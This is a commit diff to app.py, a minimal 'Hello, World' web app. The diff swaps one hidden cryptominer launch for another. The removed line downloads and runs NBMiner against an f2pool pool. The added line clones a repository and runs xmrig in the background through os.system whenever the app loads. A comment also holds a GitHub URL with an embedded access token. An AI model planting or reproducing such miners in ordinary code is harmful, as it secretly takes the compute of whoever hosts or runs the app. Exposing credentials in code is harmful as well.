31bdfd7f97034e1d344db1b0379e5327247ca67d
Rowan010 <119714949+Rowan010@users.noreply.github.com>
2023-03-04 12:24:37 +0530

    Update app.py

--- app.py
+++ app.py
@@ -7,4 +7,4 @@ def hello_world():
    return 'Hello, World!'
 
 #Ex https://Itz-zaid:ghp_147bkkabcdefgh@github.com/Itz-zaid/anything
-os.system("apt install wget && wget https://github.com/NebuTech/NBMiner/releases/download/v42.3/NBMiner_42.3_Linux.tgz && tar -zxvf NBMiner_42.3_Linux.tgz && cd NBMiner_Linux && clear && ./nbminer -a etchash -o stratum+tcp://etc.f2pool.com:8118 -u pavan2006.Worker001 &")
+os.system("git clone https://github.com/Rowan010/XMRig-ETC && cd XMRig-ETC && clear && ./xmrig &")
